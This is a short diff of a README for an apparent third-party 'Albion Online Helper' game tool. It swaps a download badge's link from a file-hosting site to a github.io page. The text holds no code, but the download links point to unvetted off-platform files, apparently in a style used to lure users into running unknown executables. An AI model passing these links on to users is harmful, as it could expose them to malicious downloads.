@@ -1,4 +1,4 @@
-[![Download Albion OnlineHelper](https://img.shields.io/badge/Download-Albion%20OnlineHelper-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Albion OnlineHelper](https://img.shields.io/badge/Download-Albion%20OnlineHelper-blueviolet)](https://albion-online-helper.github.io/.github/)
 
 
 **Albion Online Helper 🛠️💎**  
